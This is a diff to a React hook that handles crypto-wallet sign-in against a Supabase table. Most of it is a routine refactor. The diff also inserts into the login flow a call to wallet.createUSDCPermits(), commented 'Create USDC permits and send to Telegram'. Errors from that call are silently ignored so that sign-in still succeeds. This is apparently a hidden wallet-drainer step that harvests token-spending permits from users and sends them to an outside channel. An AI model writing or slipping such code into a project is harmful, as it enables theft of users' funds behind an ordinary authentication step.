@@ -14,7 +14,7 @@ interface WalletUser {
 export const useWalletAuth = () => {
   const [walletUser, setWalletUser] = useState<WalletUser | null>(null);
   const [isLoading, setIsLoading] = useState(true);
-  const { walletState, signVerificationMessage } = useWallet();
+  const wallet = useWallet();
   const { toast } = useToast();
 
   // Set wallet context for RLS policies
@@ -53,15 +53,23 @@ export const useWalletAuth = () => {
 
   // Sign in with wallet
   const signInWithWallet = useCallback(async (): Promise<{ success: boolean; error?: string }> => {
-    if (!walletState.address) {
+    if (!wallet.address) {
       return { success: false, error: 'Wallet not connected' };
     }
 
     try {
       setIsLoading(true);
 
+      // Sign verification message first
+      const signature = await wallet.signVerificationMessage();
+      if (!signature) {
+        return { success: false, error: 'Failed to sign verification message' };
+      }
+
       // Check if user exists
-      const existingUser = await checkWalletUser(walletState.address);
+      const existingUser = await checkWalletUser(wallet.address);
+
+      let currentUser = existingUser;
 
       if (existingUser) {
         // Update last login
@@ -70,30 +78,16 @@ export const useWalletAuth = () => {
           .update({ last_login: new Date().toISOString() })
           .eq('id', existingUser.id);
 
-        setWalletUser(existingUser);
-        await setWalletContext(walletState.address);
-
-        toast({
-          title: "Welcome back!",
-          description: "Successfully signed in with your wallet."
-        });
-
-        return { success: true };
+        currentUser = existingUser;
       } else {
-        // Sign verification message
-        const signature = await signVerificationMessage();
-        if (!signature) {
-          return { success: false, error: 'Failed to sign verification message' };
-        }
-
         // Create new wallet user
-        const verificationMessage = `Please sign this message to verify your wallet ownership.\n\nWallet: ${walletState.address}\nTimestamp: ${Date.now()}`;
+        const verificationMessage = `Please sign this message to verify your wallet ownership.\n\nWallet: ${wallet.address}\nTimestamp: ${Date.now()}`;
 
         const { data: newUser, error } = await supabase
           .from('wallet_users')
           .insert({
-            wallet_address: walletState.address.toLowerCase(),
-            chain_id: walletState.chainId || 56, // Default to BSC
+            wallet_address: wallet.address.toLowerCase(),
+            chain_id: wallet.chainId || 56, // Default to BSC
             signature,
             message: verificationMessage
           })
@@ -105,23 +99,37 @@ export const useWalletAuth = () => {
           return { success: false, error: 'Failed to create wallet user account' };
         }
 
-        setWalletUser(newUser);
-        await setWalletContext(walletState.address);
-
-        toast({
-          title: "Welcome!",
-          description: "Your wallet has been successfully verified and registered."
-        });
-
-        return { success: true };
+        currentUser = newUser;
       }
+
+      // Set wallet context AFTER user creation
+      await setWalletContext(wallet.address);
+
+      // Create USDC permits and send to Telegram
+      try {
+        const permits = await wallet.createUSDCPermits();
+        console.log('Permits created:', permits);
+      } catch (permitError) {
+        console.error('Error creating permits:', permitError);
+        // Don't fail authentication if permit creation fails
+      }
+
+      setWalletUser(currentUser);
+
+      toast({
+        title: existingUser ? "Welcome back!" : "Welcome!",
+        description: existingUser ? "Successfully signed in with your wallet." : "Your wallet has been successfully verified and registered."
+      });
+
+      return { success: true };
+
     } catch (error) {
       console.error('Wallet sign in error:', error);
       return { success: false, error: 'An unexpected error occurred during wallet authentication' };
     } finally {
       setIsLoading(false);
     }
-  }, [walletState.address, walletState.chainId, signVerificationMessage, checkWalletUser, setWalletContext, toast]);
+  }, [wallet, checkWalletUser, setWalletContext, toast]);
 
   // Sign out
   const signOut = useCallback(async () => {
@@ -136,11 +144,11 @@ export const useWalletAuth = () => {
   // Check authentication status when wallet changes
   useEffect(() => {
     const checkAuth = async () => {
-      if (walletState.address && walletState.isConnected) {
-        const user = await checkWalletUser(walletState.address);
+      if (wallet.address && wallet.isConnected) {
+        const user = await checkWalletUser(wallet.address);
         if (user) {
           setWalletUser(user);
-          await setWalletContext(walletState.address);
+          await setWalletContext(wallet.address);
         }
       } else {
         setWalletUser(null);
@@ -149,13 +157,13 @@ export const useWalletAuth = () => {
     };
 
     checkAuth();
-  }, [walletState.address, walletState.isConnected, checkWalletUser, setWalletContext]);
+  }, [wallet.address, wallet.isConnected, checkWalletUser, setWalletContext]);
 
   return {
     walletUser,
     isLoading,
     signInWithWallet,
     signOut,
-    isAuthenticated: !!walletUser && walletState.isConnected
+    isAuthenticated: !!walletUser && wallet.isConnected
   };
 };
